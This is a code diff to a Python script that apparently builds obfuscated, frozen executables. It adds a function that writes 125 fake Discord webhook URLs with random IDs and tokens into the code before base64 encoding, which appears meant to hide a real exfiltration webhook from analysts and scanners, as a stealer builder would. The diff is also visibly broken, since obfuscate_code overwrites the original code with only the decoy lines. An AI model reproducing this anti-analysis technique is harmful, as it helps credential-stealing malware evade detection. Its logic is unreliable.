@@ -8,6 +8,38 @@ import marshal
 import bz2
 import ctypes
 import webbrowser
+import random
+import string
+
+def generate_fake_webhooks(writed):
+    junkcode = ""
+    hooksname = (
+        ["real_webhook", "thewebhook", "webh", "fake_webhook", "fake_wbh", "webHOOK"]
+        if writed else
+        ["wbh", "real_webhook", "thewebhook", "webh", "fake_webhook", "fake_wbh", "webHOOK"]
+    )
+    hookstype = [
+        "https://discord.com/api/webhooks/",
+        "https://discordapp.com/api/webhooks/",
+        "https://ptb.discord.com/api/webhooks/",
+        "https://canary.discord.com/api/webhooks/"
+    ]
+    hookslength = [68, 67, 66, 65]
+    lastpart = "-"
+    lstpart = "_"
+
+    for _ in range(125):
+        hook_name = random.choice(hooksname)
+        hook_type = random.choice(hookstype)
+        hook_length = random.choice(hookslength)
+        random_digits = ''.join(random.choice(string.digits) for _ in range(18))
+        random_suffix = ''.join(random.choice(string.ascii_letters + string.digits + lastpart + lstpart) for _ in range(hook_length))
+        
+        hook = f"{hook_name} = '{hook_type}1{random_digits}/{random_suffix}'"
+        junkcode += f"{hook}\n"
+    
+    return junkcode
+
 
 def is_python_installed():
     try:
@@ -28,6 +60,7 @@ def install_cx_freeze():
     subprocess.run(["python", "-m", "pip", "install", "cx_Freeze"], check=True)
 
 def obfuscate_code(content):
+    content = generate_fake_webhooks(content)
     b64_content = base64.b64encode(content.encode()).decode()
     index = 0
     OFFSET = 10
